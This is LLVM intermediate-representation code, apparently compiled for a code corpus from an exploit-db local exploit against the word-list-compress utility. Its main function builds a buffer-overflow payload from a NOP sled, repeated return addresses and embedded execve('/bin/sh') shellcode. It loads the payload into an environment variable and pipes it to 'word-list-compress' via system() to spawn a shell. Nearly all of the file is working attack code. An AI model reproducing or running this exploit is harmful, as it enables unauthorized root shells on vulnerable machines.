; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_669.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_669.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [37 x i8] c"\EB\16[1\C0\88C\07\89[\08\89C\0C\B0\0B\8DK\08\8DS\0C\CD\80\E8\E5\FF\FF\FF/bin/sh\00", align 16
@size = common dso_local global i32 0, align 4
@address = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str = private unnamed_addr constant [50 x i8] c"word-list-compress local exploit by root / c0d3r\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"stack pointer: 0x%x\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"using return address : 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"using %d bytes shellcode\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"exploit\00", align 1
@.str.5 = private unnamed_addr constant [43 x i8] c"exploit string loaded into the enviroment\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"echo $exploit | word-list-compress c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [37 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64*, align 8
  %7 = alloca [300 x i8], align 16
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %12 = bitcast [37 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([37 x i8], [37 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 37, i1 false)
  %13 = load i32, i32* @size, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %3, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %4, align 8
  store i32 180, i32* %9, align 4
  store i32 0, i32* %11, align 4
  store i8* %16, i8** %5, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = bitcast i8* %17 to i64*
  store i64* %18, i64** %6, align 8
  store i32 0, i32* %10, align 4
  br label %19

19:                                               ; preds = %28, %0
  %20 = load i32, i32* %10, align 4
  %21 = load i32, i32* @size, align 4
  %22 = icmp slt i32 %20, %21
  br i1 %22, label %23, label %31

23:                                               ; preds = %19
  %24 = load i32, i32* @address, align 4
  %25 = sext i32 %24 to i64
  %26 = load i64*, i64** %6, align 8
  %27 = getelementptr inbounds i64, i64* %26, i32 1
  store i64* %27, i64** %6, align 8
  store i64 %25, i64* %26, align 8
  br label %28

28:                                               ; preds = %23
  %29 = load i32, i32* %10, align 4
  %30 = add nsw i32 %29, 4
  store i32 %30, i32* %10, align 4
  br label %19

31:                                               ; preds = %19
  store i32 0, i32* %10, align 4
  br label %32

32:                                               ; preds = %41, %31
  %33 = load i32, i32* %10, align 4
  %34 = load i32, i32* %9, align 4
  %35 = icmp slt i32 %33, %34
  br i1 %35, label %36, label %44

36:                                               ; preds = %32
  %37 = load i8, i8* @NOP, align 1
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %16, i64 %39
  store i8 %37, i8* %40, align 1
  br label %41

41:                                               ; preds = %36
  %42 = load i32, i32* %10, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %10, align 4
  br label %32

44:                                               ; preds = %32
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i32, i32* %11, align 4
  %47 = getelementptr inbounds [37 x i8], [37 x i8]* %2, i64 0, i64 0
  %48 = call i32 @strlen(i8* %47)
  %49 = icmp ne i32 %46, %48
  br i1 %49, label %50, label %62

50:                                               ; preds = %45
  %51 = load i32, i32* %11, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [37 x i8], [37 x i8]* %2, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = load i32, i32* %9, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %16, i64 %56
  store i8 %54, i8* %57, align 1
  %58 = load i32, i32* %9, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %9, align 4
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %11, align 4
  br label %45

62:                                               ; preds = %45
  %63 = load i32, i32* @size, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %16, i64 %64
  store i8 0, i8* %65, align 1
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0))
  %67 = call i32 (...) @get_sp()
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i32 %67)
  %69 = load i32, i32* @address, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i32 %69)
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i64 37)
  %72 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* %16, i32 1)
  %73 = call i32 @putenv(i8* %16)
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0))
  %75 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  %76 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %76)
  %77 = load i32, i32* %1, align 4
  ret i32 %77
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @get_sp(...) #3

declare dso_local i32 @setenv(i8*, i8*, i32) #3

declare dso_local i32 @putenv(i8*) #3

declare dso_local i32 @system(i8*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
